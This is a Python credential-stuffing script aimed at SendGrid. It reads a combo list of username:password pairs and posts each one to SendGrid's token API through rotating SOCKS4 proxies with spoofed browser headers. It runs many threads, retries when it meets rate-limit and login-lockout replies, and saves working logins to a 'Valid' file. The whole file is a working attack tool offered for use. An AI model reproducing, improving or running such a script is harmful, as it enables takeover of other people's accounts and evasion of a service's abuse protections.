import requests , time  , sys , threading , random

if sys.platform in ["linux","linux2"]:
	W = '\033[0m'
	G = '\033[32;1m'
	R = '\033[31;1m'
	
else:
	W = ''
	G = ''
	R = ''






# x = 1


def req(user , passw, num):

	# if x == len(listaprx):
		# x = 1
	# y = listaprx[x]
	x = 0
	while True:
		if x == 5:
			print(W + '[%s/%s] checking  : ' % (num,totalnum) ,'[', user ,']',':', '[',passw ,']', end=' ... ')
			print(R + '[ + Error + ]')
			break
		x += 1

		try:


			hd = {
				

			'Host': 'api.sendgrid.com',
			'Connection': 'close',
			# Content-Length: 50
			'Accept': '*/*',
			'Origin': 'https://app.sendgrid.com',
			'Authorization': 'token undefined',
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36',
			'Content-Type': 'application/json',
			'Referer': "https://app.sendgrid.com/login",
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8'
			}
			payload = '{"username":"%s","password":"%s"}' % (user , passw)

			session = requests.session()
			session.proxies ={'https':'socks4://%s' % (random.sample(listaprx,1)[0])}
			res = session.post('https://api.sendgrid.com/v3/public/tokens', headers=hd , data=payload , timeout=15)
			# res.raise_for_status()
			# x += 1

			if '{"token":' in res.text:
				print(W + '[%s/%s] checking  : ' % (num,totalnum) ,'[', user ,']',':', '[',passw ,']', end=' ... ')
				print(G + '[ + Live + ]')
				with open('sendgrid-Valid.txt' , 'a') as file:
					file.write(user + ':' + passw + '\n')

			elif '"message":"authorization required"' in res.text:
				print(W + '[%s/%s] checking  : ' % (num,totalnum) ,'[', user ,']',':', '[',passw ,']', end=' ... ')
				print(R + '[ + Die + ]')

			elif '"message":"too many requests"}' in res.text :
				# print('limit')


				# time.sleep(10)
				raise
			elif '"message":"exceeds max number of login attempts"' in res.text:
				raise
			else:
				print(W + '[%s/%s] checking  : ' % (num,totalnum) ,'[', user ,']',':', '[',passw ,']', end=' ... ')
				print(R + '[ + Error + ]' ,res.text)
				# raise
		except Exception as exx:
			# print(exx)
			# time.sleep(10)
			continue
		break




print(G + r'''
 ___ ___  ____         ____   ___    ___   ______ 
|   |   ||    \       |    \ /   \  /   \ |      |
| _   _ ||  D  )_____ |  D  )     ||     ||      |
|  \_/  ||    /|     ||    /|  O  ||  O  ||_|  |_|
|   |   ||    \|_____||    \|     ||     |  |  |  
|   |   ||  .  \      |  .  \     ||     |  |  |  
|___|___||__|\_|      |__|\_|\___/  \___/   |__|  
                                                  
''')
print('[ FB ] : https://www.facebook.com/bassem.beso.18659')
print('[ GitHub ] : https://github.com/beneameenth')
print()

print(R + '[X] Proxies List    : ' , end='')

filep = input()

with open(filep) as fileprx:

	listaprx = fileprx.read().split('\n')
	random.shuffle(listaprx)


print(R + '[X] Combo   List    : ' , end='')

txt = input()


with open(txt) as file:


	lista = file.read().split('\n')


totalnum = len(lista)

print('[X] Threads Number  : ' , end='')

threadnum = int(input())

threads = []

for i in lista:


	

	try:
		user , passw = i.split(':')
	except:
		continue 


	num = lista.index(i) + 1

	thread = threading.Thread(target=req , args=(user.strip() , passw.strip() , num))
	threads.append(thread)
	thread.start()

	if len(threads) == threadnum:
		for i in threads:
			i.join()
		threads = []


# print(res.headers)